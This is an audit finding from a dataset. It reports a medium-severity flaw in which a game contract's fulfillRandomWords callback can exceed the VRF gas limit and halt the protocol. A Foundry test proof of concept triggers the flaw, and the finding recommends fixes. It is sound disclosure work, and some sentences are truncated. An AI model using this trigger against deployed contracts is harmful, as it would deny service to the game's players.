# [M] fulfillRandomWords() could revert under cer-

## Summary
Severity: Medium
Contest weight: 0.4332
Dataset id: 20376
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
constructed a proof of concept that demonstrates it is possible to have a scenario in which fulfillRandomWords reverts and thereby disrupts the protocol's work. Crucial part of my POC is the variable AGENTS_TO_WOUND_PER_ROUND_IN_BASIS_POINTS. I communicated with the different value for it in future. For the POC i used 30.
```solidity
function test_fulfillRandomWords_revert() public {
    _startGameAndDrawOneRound();
    _drawXRounds(48);
    uint256 counter = 0;
    uint256[] memory wa = new uint256[](30);
    uint256 totalCost = 0;
    for (uint256 j=2; j <= 6; j++)
    {
        (uint256[] memory woundedAgentIds, ) = infiltration.getRoundInfo({roundId: j});
        uint256[] memory costs = new uint256[](woundedAgentIds.length);
        for (uint256 i; i < woundedAgentIds.length; i++) {
            costs[i] = HEAL_BASE_COST;
            wa[counter] = woundedAgentIds[i];
            counter++;
            if(counter > 29) break;
        }
        if(counter > 29) break;
    }
    totalCost = HEAL_BASE_COST * wa.length;
    looks.mint(user1, totalCost);
    vm.startPrank(user1);
    _grantLooksApprovals();
    looks.approve(TRANSFER_MANAGER, totalCost);
    infiltration.heal(wa);
    vm.stopPrank();
    _drawXRounds(1);
}
```
that the gas used for fulfillRandomWords exceeds 2 500 000. DOS of the protocol and inability to continue the game.

## Recommendation
A couple of ideas : 1) You can limit the value of AGENTS_TO_WOUND_PER_ROUND_IN_BASIS_POINTS to a small enough number so that it is 100% sure it will not reach the gas limit. 2) Consider simply storing the randomness and taking more complex follow-on actions in separate contract calls as stated in the "Security Considerations" section of the VRF's docs.
